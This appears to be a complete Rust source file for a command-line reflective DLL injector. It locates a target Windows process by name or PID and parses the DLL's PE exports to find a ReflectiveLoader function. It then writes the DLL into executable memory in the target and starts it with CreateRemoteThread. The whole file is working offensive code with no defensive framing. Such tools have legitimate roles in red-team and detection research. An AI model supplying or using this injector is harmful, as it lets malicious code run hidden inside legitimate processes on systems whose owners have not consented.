use clap::Parser;
use goblin::pe::PE;
use std::fs;
use std::path::PathBuf;
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::System::Diagnostics::Debug::*;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Path to the DLL to inject
    #[arg(short, long)]
    dll: PathBuf,

    /// Target process name or PID
    #[arg(short, long)]
    target: String,

    /// Name of the exported loader function (default: ReflectiveLoader)
    #[arg(short, long, default_value = "ReflectiveLoader")]
    export: String,
}

fn get_pid_by_name(process_name: &str) -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut entry) != 0 {
            loop {
                let name = String::from_utf16_lossy(&entry.szExeFile);
                let name = name.trim_matches('\0');
                if name.eq_ignore_ascii_case(process_name) {
                    CloseHandle(snapshot);
                    return Some(entry.th32ProcessID);
                }
                if Process32NextW(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snapshot);
    }
    None
}

fn main() {
    let args = Args::parse();

    let pid = if let Ok(pid) = args.target.parse::<u32>() {
        pid
    } else {
        match get_pid_by_name(&args.target) {
            Some(pid) => pid,
            None => {
                eprintln!("Error: Could not find process '{}'", args.target);
                std::process::exit(1);
            }
        }
    };

    println!("Target PID: {}", pid);

    let dll_content = match fs::read(&args.dll) {
        Ok(content) => content,
        Err(e) => {
            eprintln!("Error reading DLL file: {}", e);
            std::process::exit(1);
        }
    };

    let pe = match PE::parse(&dll_content) {
        Ok(pe) => pe,
        Err(e) => {
            eprintln!("Error parsing PE file: {}", e);
            std::process::exit(1);
        }
    };

    let offset = match pe.exports.iter().find(|e| e.name == Some(&args.export)) {
        Some(export) => match rva_to_offset(&pe, export.rva) {
            Some(offset) => offset,
            None => {
                eprintln!("Error: Could not calculate file offset for export '{}'", args.export);
                std::process::exit(1);
            }
        },
        None => {
            eprintln!("Error: Export '{}' not found in DLL", args.export);
            std::process::exit(1);
        }
    };

    println!("Found '{}' at file offset: 0x{:X}", args.export, offset);

    unsafe {
        let process_handle = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            0,
            pid,
        );
        if process_handle == 0 {
            eprintln!("Error: Could not open process with PID {}. Error: {}", pid, GetLastError());
            std::process::exit(1);
        }

        let remote_buffer = VirtualAllocEx(
            process_handle,
            std::ptr::null(),
            dll_content.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if remote_buffer.is_null() {
            eprintln!("Error: Could not allocate memory in target process. Error: {}", GetLastError());
            CloseHandle(process_handle);
            std::process::exit(1);
        }

        println!("Allocated {} bytes at 0x{:p} in target process", dll_content.len(), remote_buffer);

        let mut bytes_written = 0;
        if WriteProcessMemory(
            process_handle,
            remote_buffer,
            dll_content.as_ptr() as *const _,
            dll_content.len(),
            &mut bytes_written,
        ) == 0 {
            eprintln!("Error: Could not write DLL to target process. Error: {}", GetLastError());
            CloseHandle(process_handle);
            std::process::exit(1);
        }

        println!("Successfully wrote {} bytes to target process", bytes_written);

        let loader_address = remote_buffer as usize + offset;
        let thread_handle = CreateRemoteThread(
            process_handle,
            std::ptr::null(),
            0,
            Some(std::mem::transmute(loader_address)),
            remote_buffer,
            0,
            std::ptr::null_mut(),
        );

        if thread_handle == 0 {
            eprintln!("Error: Could not create remote thread. Error: {}", GetLastError());
            CloseHandle(process_handle);
            std::process::exit(1);
        }

        println!("Remote thread created! Injection complete. Thread handle: {}", thread_handle);
        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    }
}

fn rva_to_offset(pe: &PE, rva: usize) -> Option<usize> {
    for section in &pe.sections {
        let start = section.virtual_address as usize;
        let end = start + section.virtual_size as usize;
        if rva >= start && rva < end {
            return Some(rva - start + section.pointer_to_raw_data as usize);
        }
    }
    None
}
